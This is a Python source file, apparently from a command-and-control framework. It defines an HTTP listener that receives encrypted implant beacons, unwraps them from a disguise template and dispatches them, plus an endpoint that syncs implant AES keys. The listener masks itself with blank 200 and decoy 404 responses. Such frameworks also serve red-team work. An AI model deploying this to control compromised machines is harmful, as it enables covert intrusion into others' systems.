import json

from fastapi import APIRouter, Request
from fastapi.responses import Response
from launcher.utils.config import config as server_config
from infra.listeners.profile import listener_path
from pydantic import ValidationError
from ..logic.core import main_core
from infra.database.database import Host, AesKeys
from infra.database.listener_utils import listener_utils
from ..schemas.implant import parse_implant_payload
from ..utils.checking import check_host
from ..utils.communication import extract_from_template, implant_config_value
from infra.general.create_log import logger, write_log
from ..utils.crypt import decrypt_body, respond


def make_router(config: dict) -> APIRouter:
    # Builds the http router and registers the routes
    router = APIRouter()
    path = listener_path(config)

    @router.get(path)
    async def info_get():
        # Returns an empty response for GET
        return Response(status_code=200)

    @router.post(path)
    async def info_post(request: Request):
        # Receives the implant body, decrypts it and dispatches the request
        body = await request.body()
        if not body:
            return Response(status_code=200)

        # Body extract =========================================

        expected = implant_config_value(config, "implantBody")
        if expected:
            extracted = extract_from_template(body, expected)
            if extracted is None:
                return Response(status_code=200)
            body = extracted

        # =======================================================
        
        decrypted = await decrypt_body(body)
        if isinstance(decrypted, Response):
            return decrypted
        body, aes_key = decrypted

        try:
            raw = json.loads(body.decode("utf-8", errors="replace"))
        except (json.JSONDecodeError, UnicodeError) as e:
            write_log(logger, "error", f"Unhandled exception | listeners/http/commands | {e}")
            return Response(status_code=200)

        try:
            data = parse_implant_payload(raw)
        except ValidationError as e:
            write_log(logger, "error", f"Unhandled exception | listeners/http/commands | {e}")
            return Response(status_code=200)

        if isinstance(data, dict) and "host" in data:
            rows = await listener_utils.read(Host, tag=data["host"])
            if not rows:
                return await respond(aes_key, {"status": "failure", "error": "Missing host"}, status_code=400, config=config)

        await check_host(body)
        return await main_core(body, data, config, request, aes_key)

    @router.post("/sync-aes")
    async def sync_aes(request: Request):
        # Receives the implant aes key pushed by the team server that compiled it
        try:
            data = json.loads((await request.body()).decode("utf-8", errors="replace"))
        except (json.JSONDecodeError, UnicodeError):
            return Response(status_code=404)
        shared = str((server_config.get("implants") or {}).get("relay_aes_key") or "").strip()
        if not shared or data.get("auth") != shared:
            return Response(status_code=404)
        tag = str(data.get("tag") or "").strip()
        key = str(data.get("key") or "").strip()
        if tag and key:
            if await listener_utils.read(AesKeys, tag=tag):
                await listener_utils.modify(AesKeys, {"tag": tag}, {"key": key})
            else:
                await listener_utils.write(AesKeys(tag=tag, key=key))
        return Response(status_code=200)

    return router
